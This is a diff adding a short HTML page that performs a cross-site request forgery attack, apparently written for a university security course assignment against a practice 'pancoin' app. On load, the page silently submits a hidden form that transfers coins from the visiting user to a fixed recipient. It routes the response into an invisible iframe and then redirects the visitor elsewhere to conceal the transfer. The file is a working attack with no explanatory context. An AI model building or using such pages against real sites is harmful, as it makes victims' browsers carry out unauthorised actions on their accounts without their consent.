@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.getElementById('xfer_form').submit();">
+<form method="POST" id="xfer_form" action="https://mathlab.utsc.utoronto.ca/courses/cscd27f14/rosselet/asn/a3/pancoin/transfer.php">
+        <input type="hidden" name="pancoins" value="5" size=4 />
+        <input type="hidden" name="recipient" value="a" />
+        <input type="hidden" name="submission" value="Send" />
+</form>
+
+<iframe id="target_form" name="target_form" style="visibility: hidden;">     
+</iframe>
+
+</body>
+</html>
+
+
+<script type="text/javascript">
+var frame = document.getElementById('target_form');
+var form = document.getElementById('xfer_form');
+form.target = frame.name;
+frame.addEventListener('load', function() {
+                window.location = "https://mathlab.utsc.utoronto.ca/courses/cscd27f14/rosselet/index.shtml";
+                }, false);
+form.submit();
+
+</script>
+
